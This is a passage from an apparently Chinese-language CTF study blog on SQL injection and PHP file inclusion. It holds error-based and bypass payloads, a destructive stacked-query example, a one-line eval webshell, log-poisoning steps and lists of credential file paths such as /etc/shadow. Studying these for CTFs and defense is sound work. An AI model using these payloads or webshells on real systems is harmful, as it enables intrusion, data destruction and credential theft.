<p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p>
<p>同样道理，当没有对应路径的时候会报错</p>
<pre><code class="highlight plaintext">&#x27; and updatexml(&#x27;div&#x27;, concat(&#x27;~&#x27;,database()),&#x27;hi&#x27;)#
&#x27; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+
</code></pre>

<p>其他同上</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<pre><code class="highlight plaintext">堆叠注入中奇怪的知识点
1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)
设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。
</code></pre>

<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>在正常注册(假设账户名为admin)后登录，尝试修改密码，使用admin’#这个用户名修改却发现成功修改了admin的密码，这就说明存在二次注入的漏洞了</p>
<pre><code class="highlight plaintext">二次注入，实际上就是在注入数据之后，利用系统查询数据的用脏数据进行第二次的攻击，从而达到入侵数据库的目的</code></pre>

<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>一般来说，如果开发人员在开发的时候，对传入的参数进行了特殊的函数处理，比如使用了trim()函数，htmlspecialchars()函数，addlashes函数，是可以过滤我们非法提交的参数，从而导致SQL注入无法成功。</p>
<p>作为攻击者，要完成的是对参数的拼接，从而导致恶意的SQL语句写入。作为开发者要完成的是SQL输出参数的一个过滤比如对恶意的字符进行转移</p>
<h4 id="常用过滤函数"><a href="#常用过滤函数" class="headerlink" title="常用过滤函数"></a><strong>常用过滤函数</strong></h4><p><strong>trim()函数</strong><br>移除字符串两侧的空白字符或其他预定义字符<br><strong>htmlspecialchars()函数</strong><br>把预定义的字符”&lt;”和”&gt;”转换为HTML实体，预防XSS<br><strong>addslashes()函数</strong><br>返回在预定义字符之前添加反斜杠的字符串</p>
<pre><code class="highlight sql"># 预定义字符
<span class="number">1.</span>单引号(<span class="string">&#x27;)</span>
<span class="string">2.双引号(&quot;)</span>
<span class="string">3.反斜杠(\)</span>
<span class="string">4.NULL</span></code></pre>

<p>上述函数常在CMS里使用进行过滤</p>
<h4 id="宽字节注入条件"><a href="#宽字节注入条件" class="headerlink" title="宽字节注入条件"></a><strong>宽字节注入条件</strong></h4><p>1.数据库为GBK编码<br>2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符 \ 进行转义</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre><code class="highlight plaintext">root %df&#x27; or 1=1 #
# 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</code></pre>



<h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>在SQL执行字符串处理操作时，字符串末尾的空格符将会被删除，换句话说”user”是等同于”user     “的，对于绝大多数的情况这两个相等都是成立的(像WHERE子句的字符串和INSERT语句中的字符串)</p>
<blockquote>
<p>[!WARNING]</p>
<p>但是在像LIKE 子句中这是不成立的。因为对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在<a href="https://support.microsoft.com/en-in/kb/316626">内部</a>使用空格来填充字符串，以便在比较之前使其它们的长度保持一致</p>
</blockquote>
<p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”</p>
<p><strong>攻击手段</strong></p>
<p>注册一个用户名+一堆括号+1的用户名和自己的passwd(未超出长度限制的字符应该只包含已知的用户名和空白字符)</p>
<p>注:在查询时，SQL是不会将字符串截断的。因此，使用完整的字符串进行搜索，所以不会找到匹配的结果。但当执行INSERT查询语句时，它只会插入被限制长度的字符。</p>
<p>在攻击结束后，输入后来我们自己的密码和已给的用户名，会登录上原始用户</p>
<pre><code class="highlight plaintext">解决办法:
将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。

最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪

为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</code></pre>



<h2 id="Episode-3-在拿到flag的边缘疯狂试探-盲注"><a href="#Episode-3-在拿到flag的边缘疯狂试探-盲注" class="headerlink" title="Episode 3 在拿到flag的边缘疯狂试探:盲注"></a>Episode 3 在拿到flag的边缘疯狂试探:盲注</h2><p>(哈哈，盲注脚本吗，你问我，我只能说最好自己写一个，网上淘来的毕竟是别人的不如你自己搓的顺手)</p>
<p>先确定注入型，再用and连接一下</p>
<pre><code class="highlight sql">布尔盲注
<span class="number">1.</span> length(database())<span class="operator">&gt;</span>??? 初步判断
<span class="number">2.</span></code></pre>

<h2 id="Episode-4-注入点-猜猜我在哪里呢"><a href="#Episode-4-注入点-猜猜我在哪里呢" class="headerlink" title="Episode 4 注入点:&gt;猜猜我在哪里呢"></a>Episode 4 注入点:&gt;猜猜我在哪里呢</h2><h2 id="Episode-5-你好，绕WAF"><a href="#Episode-5-你好，绕WAF" class="headerlink" title="Episode   5  你好，绕WAF"></a>Episode   5  你好，绕WAF</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>如过过滤了and和AND，试试And</p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果waf把and替换为空</p>
<p>然后可以使用<code>anandd</code>绕过</p>
<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>&#x2F;**&#x2F;  注释符号</p>
<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>

<p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p>
<p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p>
<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p>
<h3 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h3><p>考虑管道符||表示or和&amp;&amp;表示and</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h3><p>改成like或者&lt;或者&gt;</p>
<p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p>
<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后
<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
#
<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行
#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行
<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>

<h3 id="比较符号-绕过"><a href="#比较符号-绕过" class="headerlink" title="比较符号(&lt; &gt;)绕过"></a>比较符号(&lt; &gt;)绕过</h3><p>一般是盲注要用到捏</p>
<p>最常见的一个盲注的sql语句：</p>
<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>

<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>

<h3 id="绕过关键字-union-select，where"><a href="#绕过关键字-union-select，where" class="headerlink" title="绕过关键字(union,select，where)"></a>绕过关键字(union,select，where)</h3><p>1）使用注释符绕过：</p>
<p>常用注释符：</p>
<p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p>
<p>用法：</p>
<p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
<p>2）使用大小写绕过：</p>
<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
<p>3）内联注释绕过：</p>
<p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
<p>4） 双关键字绕过：</p>
<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
<h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a>通用编码绕过</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
<p>or1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin()&#x3D;&#x3D;&gt;ascii()</p>
<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
<p>mid()、substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p>
<p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74或者：</p>
<p>substr((select’password’),1,1)&#x3D;0x70strcmp(left(‘password’,1),0x69)&#x3D;1strcmp(left(‘password’,1),0x70)&#x3D;0strcmp(left(‘password’,1),0x71)&#x3D;-1</p>
<h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><p>网页显示常常只能给出有限长度的字母，这个时候就要通过一些函数来绕过</p>
<pre><code class="highlight sql"><span class="number">1</span>、<span class="keyword">left</span>（<span class="number">201809</span>,<span class="number">4</span>）截取左边的<span class="number">4</span>个字符
<span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="number">201809</span>,<span class="number">4</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">2018</span>

<span class="number">2</span>、<span class="keyword">right</span>（name,<span class="number">2</span>）截取右边的<span class="number">2</span>个字符
<span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="number">201809</span>,<span class="number">2</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">09</span>

<span class="number">3</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">5</span>,<span class="number">3</span>) 截取name这个字段 从第五个字符开始 只截取之后的<span class="number">3</span>个字符
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：事业部

<span class="number">4</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">3</span>) 截取name这个字段 从第三个字符开始，之后的所有个字符
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：融资事业部

<span class="number">5</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，直到结束
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事业部

<span class="number">6</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>，<span class="number">2</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，只截取之后的<span class="number">2</span>个字符
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>,<span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事
注意：我们注意到在函数 <span class="built_in">substring</span>(str,pos, len)中， pos 可以是负值，但 len 不能取负值。

<span class="number">7</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> 之前的所有字符
<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：www.baidu

<span class="number">8</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> （倒数）之后的所有字符
<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：baidu.com

<span class="number">9</span>、SUBSTR(name, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(name)<span class="number">-3</span>) 截取name字段，取除name字段后三位的所有字符
<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;成都融资事业部&#x27;</span>, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>)<span class="number">-3</span>)            <span class="operator">/</span><span class="operator">/</span>结果：成都融资

<span class="number">10</span>、mid(str,<span class="keyword">start</span>,[length])
str:截取的字符串   <span class="keyword">start</span>:起始位置   length:截取的长度，可以忽略

<span class="number">11.</span>reverse(concat(<span class="number">0x3a</span>，(<span class="keyword">select</span>(group_concat(real_flag_1s_here))<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>))))
用reverse倒序输出，有时候有奇效。?大概吧</code></pre>



<h2 id="Episode-6-模糊匹配"><a href="#Episode-6-模糊匹配" class="headerlink" title="Episode 6  模糊匹配"></a>Episode 6  模糊匹配</h2><p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p>
<p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p>
<p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p>
<p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p>
<p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p>
<p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p>
<p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p>
<p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p>
<h2 id="Episode-7-奇奇怪怪的知识点积累"><a href="#Episode-7-奇奇怪怪的知识点积累" class="headerlink" title="Episode   7 奇奇怪怪的知识点积累"></a>Episode   7 奇奇怪怪的知识点积累</h2><p><strong>短路算法：</strong></p>
<p>|| 逻辑或的短路：a||b</p>
<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
<p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p>
<p><strong>WITH ROLLUP:</strong>(来自ctfshow web10)</p>
<pre><code class="highlight plaintext">语法:group by xxx with rollup</code></pre>

<p>with rollup是对前面数据的一次汇总，此时在查询的数据中会被插入一行值为NULL,此时即可绕过长度检验</p>
<h2 id="Episode-8-一点感想"><a href="#Episode-8-一点感想" class="headerlink" title="Episode   8 一点感想"></a>Episode   8 一点感想</h2><p>刷了一些题目，发现最重要的其实是注入点的判断(除非是万恶的盲注，那重点可能更在脚本上)</p>
<p>[参考文章]: <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html">https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html</a>	“基于约束的SQL攻击 - Angel_Kitty - 博客园”<br>[参考文章]: <a href="https://www.cnblogs.com/icui4cu/p/15136893.html">https://www.cnblogs.com/icui4cu/p/15136893.html</a>	“宽字节注入原理及绕过方式”</p>
]]></content>
      <tags>
        <tag>-web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>依赖于<code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code>这些函数的漏洞</p>
<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含</p>
<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
<p><strong>#</strong> <strong>几个函数的区别</strong></p>
<p>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>include():找不到被包含的文件只会产生警告，脚本继续执行<br>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
<p>只要文件中存在<code>php</code>代码都会被解析出来</p>
<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)<br>测试网页包含如下代码:</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];
	<span class="keyword">include</span>(<span class="variable">$file</span>);
<span class="meta">?&gt;</span></code></pre>

<p>网站利用文件包含功能读取一些<code>php</code>文件，例如<code>phpinfo</code>:</p>
<p>利用该代码，我们可以读取一些系统本地的敏感信息。<br>例如:<code>C:\Windows\system.ini</code>文件。<br>（1）使用绝对路径<br>使用绝对路径直接读取:</p>
<p>（2）使用相对路径进行读取<br>通过.&#x2F;表示当前位置路径，<code>../</code>表示上一级路径位置，在linux中同样适用。</p>
<p>例如当前页面所在路径为<code>C:\Apache24\htdocs\</code>，我们需要使用…&#x2F;退到C盘再进行访问，构造路径如下：<br><code>../../windows/system.ini</code></p>
<p>由于我的环境搭建在D盘，所以这里就不做演示了。</p>
<p>（3）一些常见的敏感目录信息路径:<br>Windows系统:</p>
<pre><code class="highlight plaintext">C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
C:\windows\repair\sam //存储Windows系统初次安装的密码
C:\ProgramFiles\mysql\my.ini //Mysql配置
C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码
C:\windows\php.ini //php配置信息
Linux/Unix系统:

/etc/password //账户信息
/etc/shadow //账户密码信息
/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
/usr/local/app/php5/lib/php.ini //PHP相关配置
/etc/httpd/conf/httpd.conf //Apache配置文件
/etc/my.conf //mysql配置文件</code></pre>

<p>三、LFI漏洞利用技巧<br>1.配合文件上传使用<br>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
<p>以DVWA平台为例，将Security Level选择low，编辑一个图片马，内容如下:</p>
<pre><code class="highlight plaintext">&lt;?php
	fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[123]);?&gt;);
?&gt;</code></pre>

<p>找到上传点进行上传：</p>
<p>得到文件保存的完整路径</p>
<p>现在我们利用页面去执行我们上传的图片马</p>
<p>有能够读取文件的php页面，直接构造url读取，代码成功解析</p>
<p>注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p>
<p>2.包含Apache日志文件<br>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log，日志文件如下:</p>
<p>当我们正常访问一个网页时，如&#96;<a href="http://127.0.0.1/phpinfo.php%EF%BC%8Caccess%E6%97%A5%E5%BF%97%E4%BC%9A%E8%BF%9B%E8%A1%8C%E8%AE%B0%E5%BD%95%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA">http://127.0.0.1/phpinfo.php，access日志会进行记录，如下图所示</a>:</p>
<p>如果我们访问一个不存在的资源，也一样会进行记录，例如访问</p>
<pre><code class="highlight plaintext">127.0.0.1&lt;?php phpinfo();?&gt;</code></pre>

<p>网页会显示403</p>
<p>但查看日志会发现被成功记录但被编码了</p>
<p>我们再次进行访问，并使用burp抓包，发现被编码：</p>
<p>我们将报文修改回去，再进行发送即可：</p>
<p>此时再查看access日志，正确写入php代码：</p>
<p>再通过本地文件包含漏洞访问，即可执行</p>
<p>我们可以在此处写入一句话木马，再使用webshell管理工具进行连接。</p>
<p>3.包含SESSION文件<br>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
<p>利用条件:</p>
<p>找到Session内的可控变量<br>Session文件可读写，并且知道存储路径<br>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
<p>session常见存储路径:</p>
<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<br>session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。<br>相关案例可以查看这道CTF题一道CTF题：PHP文件包含</p>
<p>4.包含临时文件</p>
<p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
<p>这个方法可以参考LFI With PHPInfo Assistance<br>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题： XMAN夏令营-2017-babyweb-writeup</p>
<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><h2 id="必备知识-php伪协议"><a href="#必备知识-php伪协议" class="headerlink" title="必备知识:php伪协议"></a>必备知识:php伪协议</h2><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :off&#x2F;on</li>
</ul>
</li>
<li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>
</li>
<li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
</li>
<li><p><strong>用法</strong>：</p>
<pre><code class="highlight pgsql">/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
relative/<span class="type">path</span>/<span class="keyword">to</span>/file.ext
fileInCwd.ext
C:/<span class="type">path</span>/<span class="keyword">to</span>/winfile.ext
C:\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
\\smbserver\<span class="keyword">share</span>\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext
file:///<span class="type">path</span>/<span class="keyword">to</span>/file.ext</code></pre>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>file://[文件的绝对路径和文件名]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQAZ" alt="图片描述"></p>
</li>
<li><p><code>[文件的相对路径和文件名]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQA1" alt="图片描述"></p>
</li>
<li><p><code>[http：//网络路径和文件名]</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBb" alt="图片描述"></p>
</li>
</ol>
</li>
<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=YtcHVUno34rLTBJUcxsHxA==.SAMo1ZcMmiqVqJxFosbgOTO2nJi4mSvGX5no8jrMTl7u2z1qAxlTLJm6Xm7Rs3Ze">http://php.net/manual/zh/wrappers.file.php</a></p>
</li>
</ul>
<h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li>
</ul>
</li>
<li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
</li>
<li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
